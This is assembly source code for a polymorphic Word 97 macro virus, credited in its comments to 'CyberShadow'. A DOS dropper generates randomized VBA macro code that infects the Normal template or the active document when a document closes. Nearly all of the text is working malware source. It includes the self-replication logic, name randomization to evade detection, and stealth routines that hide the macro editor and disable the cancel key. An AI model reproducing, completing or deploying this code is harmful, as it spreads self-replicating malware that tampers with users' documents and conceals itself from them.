.model tiny
.code
.386
;------------------------------------------------------------------------------
;New shit from CyberShadow... My viruses Polymac.a and Polymac.b says me,  that
;    polymorphic  macro  viruses  possible,  but  slow :(, so I think: "Asm are
;    fastest language and asm must working in hard procedures... So here it is:
;Macro polymorphic virus (I don't want make hard polymorphic engine for VBA  no
;    more,  that's  why  macro  polymorph easy). NEW infection method: writting
;    dump  of  binary  virus  code to file, start it and binary part create new
;    source.  Looks like that: dropper.com SourceFilename RandomByte (1-7)shit.
;    if random byte more than 4, then creating source for infect ActiveDocument
;    else for infecting NormalTemplate...
;께께께께께께께께께께께께께께께께께께께�
;께께께콾ame같같같같-캜mdLiner께께께께께
;께께Stealph같같같같-컔es께께께께께께께�
;께Polymorph같같같같-컔es께께께께께께께�
;께께쾆arget같같같같-캷ord97캾ocuments께
;께Infection컈ethod�-캧nsertLines께께께�
;께께쾆o캽ompile컐se캴asm캻nd캴link께께�
;같같같같같같같같같같같같같같같같같같같�
;------------------------------------------------------------------------------
;variableFullContain - contain text of ???.com file for starting
;filename	- random file name
;number		- byte (1-5) reserved for file handle
;NormalOrActive - contain path to NormalTemplate or ActiveDocument
;variableName	- name of variable contained text of ???.com file for starting
;CmdLine	- command line as 1st: random filename, 2nd - 1 or 2 for
;          	  Normal.dot or ActiveDocument to be infected
;EndOfLine	- end of line presents
;Finish         - end of encryptor...
;var2		- encription counter
;------------------------------------------------------------------------------
variableFullContain equ 0
filename	equ 1
number		equ 2
NormalOrActive	equ 3
variableName	equ 4
CmdLine		equ 5
EndOfLine	equ 6
Finish		equ 7
var2		equ 8
	org 100h
start:
	push cs cs
	pop ds es
	cld
        cmp byte ptr ds:[80h],0
        je GottaFuckOut
        mov si,82h
	mov di,offset filename_
FindFileName:
	lodsb
	stosb
	cmp al,32
	mov al,0
	jne FindFileName
	mov es:[di-1],al

	lodsb
	mov ds:[ViriiType],al	;Infection type (Normal.dot or ActiveDocument)
	call rnd
	and al,3
	add al,'1'
	mov number1,al
	
	mov di,offset FName
	call GetName

	mov di,offset varName
	call GetName
	
	mov di,offset var2_1
	call GetName

	mov si,offset MacroEncryptor
	mov di,offset BodyToSave
	call CreateBody
	mov cx,di
	mov dx,offset BodyToSave
	sub cx,dx
	push cx dx
	mov dx,offset filename_
	xor cx,cx
	mov ah,3ch
	int 21h
	xchg bx,ax
	pop dx cx
	mov ah,40h
	int 21h
	mov ah,3eh
	int 21h
GottaFuckOut:
	mov ah,4ch
	int 21h
;------------------------------------------------------------------------------
GetName:
	call rnd
	and al,7
	inc al
	mov cl,al
CycleFName:
	call rnd
	and al,15
	add al,'a'
	stosb
	dec cl
	jne CycleFName
	xor al,al
	stosb
	ret
;------------------------------------------------------------------------------
CreateBody:
	lodsb
	cmp al,8
	ja continueCreating
	mov bl,al
	xor bh,bh
	shl bx,1
	add bx,offset jumpTable
	push offset CreateBody
	jmp word ptr ds:[bx]
continueCreating:
	stosb
	jmp CreateBody
VFC:
	push si
	mov si,offset start		;WARNING!!!  For  polymorphic  version
					; this offset must be set  to start of
					; crypted code!!!
	mov cx,offset ViriiType-offset start
					;WARNING!!! CX must contains length of
					; crypted code!!!
	call VN
	mov al,'='
	stosb
	mov ds:[FlagUp],0
	mov ds:[CountOfChar],0
	cmp byte ptr ds:[si],33
	jb CycleOfPacking
	mov ds:[FlagUp],1
	mov al,'"'
	stosb
CycleOfPacking:
	lodsb
	call checkChar
	jc MakeCHR
	cmp byte ptr ds:[FlagUp],1
	je NoSetFlagUp
	push ax
	mov ds:[FlagUp],1
	mov al,'"'
	stosb
	pop ax
NoSetFlagUp:
	stosb
	jmp NextChar
MakeCHR:
	push ax
	cmp ds:[FlagUp],1
	jne NoNeedInIt
	mov ds:[FlagUp],0
	cmp ds:[CountOfChar],0
	je NoNeedInIt
	mov ax,'+"'
	stosw
NoNeedInIt:
	mov eax,'$RHC'
	stosd
	mov al,'('
	stosb
	pop ax
	call prtDec
	mov ax,"+)"
	stosw
NextChar:
	inc byte ptr ds:[CountOfChar]
	cmp byte ptr ds:[CountOfChar],15
	jbe GoingNext
	call FinishLine
	call SetVarName
	mov byte ptr ds:[CountOfChar],0
	cmp byte ptr ds:[FlagUp],1
	jne GoingNext
	mov al,ds:[si]
	call checkChar
	jc GoingNext
	mov al,'"'
	stosb
GoingNext:
	dec cx
	jne CycleOfPacking
	call FinishLine
	pop si
	ret
FN:
	push si
	mov si,offset FName
FNCycle:
	lodsb
	or al,al
	je noNewFN
	stosb
	jmp FNCycle
noNewFN:
	pop si
	ret
num:
	mov al,ds:[number1]
	stosb
	ret
nORa:
	push si
	mov si,offset ActiveDoc
	cmp byte ptr ds:[ViriiType],'4'
	jae nORa1
	mov si,offset NormalTemplate
nORa1:
	lodsb
	or al,al
	je outtanORa
	stosb
	jmp nORa1
outtanORa:
	pop si
	ret
VN:
	push si
	mov si,offset varName
	jmp FNCycle
CmdL:
	call rnd
	and al,3
	add al,'0'
	cmp byte ptr ds:[ViriiType],'4'
	jae CmdL1
	add al,4
CmdL1:
	stosb
	call GetName
	dec di
	ret
EndOfL:
	call rnd
	cmp al,127
	jae EndOfL1
	mov ax,0a0dh
	stosw
	ret
EndOfL1:
	mov al,':'
	stosb
	ret
checkChar:
	cmp al,33
	jbe MakeCheck
	cmp al,22h
	je MakeCheck
	cmp al,127
	jae MakeCheck
	clc
	ret
MakeCheck:
	stc
	ret
var2_:
	push si
	mov si,offset var2_1
	jmp FNCycle
;------------------------------------------------------------------------------
SetVarName:
	call VN
	mov al,"="
	stosb
	call VN
	mov al,"+"
	stosb
	ret
FinishLine:
	mov al,'"'
	stosb
	cmp byte ptr ds:[FlagUp],1
	je Finished
	stosb
Finished:
	mov ax,0a0dh
	stosw
	ret
prtDec:
	xor ah,ah
	mov bp,10
	mov bx,3
cont_div:
	xor dx,dx
	div bp
	add dl,'0'
	mov [di+bx-1],dl
	dec bx
	jne cont_div
	add di,3
	ret
;------------------------------------------------------------------------------
rnd:
	push si
	call rnd_1
	db 0
	db 54
	db 136
rnd_1:
	pop si
	mov al,cs:[si]
	or al,al
	jne rnd_2
rnd_3:
	in al,40h
	or al,al
	je rnd_3
rnd_2:
	add al,cs:[si+1]
	mov cs:[si],al
	add al,cs:[si+2]
	mov cs:[si+1],al
	ror al,1
	mov cs:[si+2],al
	xor ah,ah
	pop si
	ret
;------------------------------------------------------------------------------
jumpTable dw offset VFC, offset FN, offset num, offset nORa, offset VN
	dw offset CmdL, offset EndOfL, offset noNewFN,var2_
;------------------------------------------------------------------------------
NormalTemplate db 'NormalTemplate',0
ActiveDoc db 'ActiveDocument',0
;------------------------------------------------------------------------------
MacroEncryptor:
db 'private sub Document_Close()',0dh,0ah
;db 'private sub try()',0dh,0ah
db 'on error resume next',0dh,0ah
db variableFullContain
db 'open "',filename,'.com" for output as ',number,EndOfLine
db 'print #',number,',',variableName,EndOfLine
db 'close #',number,EndOfLine
db 'rv = Shell("',filename,'.com ',filename,' ',CmdLine,'", 6)',EndOfLine
db 'kill "',filename,'.com"',EndOfLine
db 'for ',var2,'=1 to 500000',EndOfLine,'next',EndOfLine
db 'open "',filename,'" for input as ',number,EndOfLine
db 'Dim ',filename,EndOfLine
db var2,'=0',EndOfLine
db NormalOrActive,'.VBProject.VBComponents(1).CodeModule.deletelines 1,CountofLines',EndOfLine
db 'Do While Not EOF(',number,')',EndOfLine
db var2,'=',var2,'+1',EndOfLine
db 'Line Input #',number,',',filename,EndOfLine
db NormalOrActive,'.VBProject.VBComponents(1).CodeModule.insertlines ',var2,',',filename,EndOfLine
db 'Loop',EndOfLine
db 'close #',number,EndOfLine
db 'kill "',filename,'"',0dh,0ah
db 'end sub',0dh,0ah
db 'Private Sub ViewVBCode()',EndOfLine,'Stealth',EndOfLine,'End Sub',0dh,0ah
db 'Private Sub ToolsMacro()',EndOfLine,'Stealth',EndOfLine,'End Sub',0dh,0ah
db 'Private Sub FileTemplates()',EndOfLine,'Stealth',EndOfLine,'End Sub',0dh,0ah
db 'Private Sub Stealth()',EndOfLine,' On Error Resume Next',0dh,0ah
db 'Application.ShowVisualBasicEditor = 0',EndOfLine,'Application.EnableCancelKey = 0',0dh,0ah
db 'End Sub'
db finish
ViriiType db ?
CountOfChar db ?
FlagUp db ?
number1	db ?
filename_ db 255 dup (?)
FName	db 9 dup (?)
varName	db 9 dup (?)
var2_1 	db 9 dup (?)
BodyToSave:
end start
